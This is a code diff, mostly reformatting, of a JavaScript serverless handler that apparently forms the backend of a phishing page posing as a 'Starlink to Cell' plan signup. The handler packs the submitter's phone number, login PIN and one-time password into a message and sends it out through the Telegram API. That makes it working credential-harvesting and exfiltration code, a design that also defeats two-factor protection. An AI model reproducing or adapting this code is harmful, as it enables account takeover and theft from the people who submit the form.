@@ -64,23 +64,28 @@ export default async function handler(req, res) {
   const logged = { ...payload };
   if (logged.loginPin) logged.loginPin = mask(logged.loginPin);
   if (logged.otp) logged.otp = mask(logged.otp);
-  console.log('sendTelegram invoked. payload (masked):', JSON.stringify(logged));
+  console.log(
+    'sendTelegram invoked. payload (masked):',
+    JSON.stringify(logged)
+  );
 
   // Build HTML message
   let text = '<b>New Starlink to Cell Request</b>\n\n';
-  if (payload.submittedAt)
+
+  if (payload.submittedAt) {
     text += `<b>Time:</b> ${escHTML(payload.submittedAt)}\n\n`;
+  }
 
   // Selected plan details
   if (payload.selectedPlan && typeof payload.selectedPlan === 'object') {
     const p = payload.selectedPlan;
     text += '<b>Selected Plan:</b>\n';
-    if (p.id)       text += `<b>ID:</b> ${short(p.id)}\n`;
-    if (p.name)     text += `<b>Name:</b> ${short(p.name)}\n`;
-    if (p.shortName)text += `<b>Short name:</b> ${short(p.shortName)}\n`;
-    if (p.price)    text += `<b>Price:</b> ${short(p.price)}\n`;
-    if (p.duration) text += `<b>Validity:</b> ${short(p.duration)}\n`;
-    if (p.summary)  text += `<b>Summary:</b> ${short(p.summary)}\n`;
+    if (p.id)        text += `<b>ID:</b> ${short(p.id)}\n`;
+    if (p.name)      text += `<b>Name:</b> ${short(p.name)}\n`;
+    if (p.shortName) text += `<b>Short name:</b> ${short(p.shortName)}\n`;
+    if (p.price)     text += `<b>Price:</b> ${short(p.price)}\n`;
+    if (p.duration)  text += `<b>Validity:</b> ${short(p.duration)}\n`;
+    if (p.summary)   text += `<b>Summary:</b> ${short(p.summary)}\n`;
     text += '\n';
   }
 
@@ -89,7 +94,9 @@ export default async function handler(req, res) {
     text += '<b>Login details:</b>\n';
     text += `<b>Phone:</b> ${escHTML(payload.loginPhone)}\n`;
     text += `<b>PIN:</b> ${escHTML(payload.loginPin)}\n`;
-    if (payload.otp) text += `<b>OTP:</b> ${escHTML(payload.otp)}\n`;
+    if (payload.otp) {
+      text += `<b>OTP:</b> ${escHTML(payload.otp)}\n`;
+    }
     text += '\n';
   }
 
@@ -142,7 +149,10 @@ export default async function handler(req, res) {
       return res.status(200).json(parsed);
     }
   } catch (e) {
-    console.error('Fetch error when calling Telegram API:', e && e.message);
+    console.error(
+      'Fetch error when calling Telegram API:',
+      e && e.message
+    );
     return res.status(500).send('Fetch error: ' + (e && e.message));
   }
-        }
+}
